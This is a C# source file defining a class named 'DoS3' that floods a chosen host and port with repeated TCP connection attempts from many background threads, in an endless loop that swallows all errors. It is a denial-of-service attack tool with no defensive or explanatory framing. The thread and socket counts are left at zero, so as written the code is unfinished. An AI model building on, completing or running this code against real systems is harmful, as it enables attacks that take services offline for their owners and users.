using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;


/*
 * To finish this project you must take part of course about background processes
 * link: https://msdn.microsoft.com/en-us/library/system.threading.thread.isbackground(v=vs.110).aspx
 */
namespace PM4P
{
    class DoS3
    {
        private static ThreadStart[] thrdstart;
        private static Thread[] thrd;
        private static string host;
        private static IPEndPoint ipend;
        private static int port;
        private static SendSyn[] sndsyn;
        private static int loc = 0;
        private static int synint = 0;
        private string dt;

        public void getparam(string hostparam, int portparam, string datatext)
        {
            host = hostparam;
            port = portparam;
            dt = datatext;
        }

        public string runfunction()
        {
            Thread obj = new Thread(threadattack);
            
            obj.IsBackground = true;
            obj.Start();

            return dt;
        }

        private void threadattack(Object obj)
        {
            try
            {
                syner();
            }
            catch
            {

            }
        }

        private void syner()
        {
            try
            {
                ipend = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            }
            catch
            {
                ipend = new IPEndPoint(IPAddress.Parse(host), port);
            }
            thrd = new Thread[synint];
            thrdstart = new ThreadStart[synint];
            sndsyn = new SendSyn[synint];

            for(int i = 0; i < synint; ++i)
            {
                sndsyn[i] = new SendSyn(ipend, loc);
                thrdstart[i] = new ThreadStart(sndsyn[i].synthrd);
                thrd[i] = new Thread(thrdstart[i]);
                thrd[i].Start();
            }
        }

        public void synstop()
        {
            for (int i = 0; i < synint; ++i)
            {
                try
                {
                    thrd[i].Abort();
                }
                catch
                {
                }
            }
        }

        private class SendSyn
        {
            private IPEndPoint synend;
            private Socket[] synsock;
            private int synint;

            public SendSyn(IPEndPoint ipEo, int ar)
            {
                synend = ipEo;
                synint = ar;
            }

            public void synrslt(IAsyncResult ar)
            {
            }

            public void synthrd()
            {
                int eye = 0;
                label:
                try
                {
                    synsock = new Socket[synint];
                    for (eye = 0; eye < synint; ++eye)
                    {
                        synsock[eye] = new Socket(synend.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        synsock[eye].Blocking = false;
                        AsyncCallback async = new AsyncCallback(synrslt);
                        synsock[eye].BeginConnect(synend, async, synsock[eye]);
                    }
                    Thread.Sleep(100);
                    for(eye = 0; eye < synint; ++eye)
                    {
                        if(synsock[eye].Connected)
                            synsock[eye].Disconnect(false);

                        synsock[eye].Close();
                        synsock[eye] = null;
                    }
                    synsock = null;
                    goto label;
                }
                catch
                {
                    for (eye = 0; eye < synint; ++eye)
                    {
                        try
                        {
                            if (synsock[eye].Connected)
                                synsock[eye].Disconnect(false);

                            synsock[eye].Close();
                            synsock[eye] = null;
                        }
                        catch
                        {
                        }
                    }
                    goto label;
                }
            }
        }
    }
}
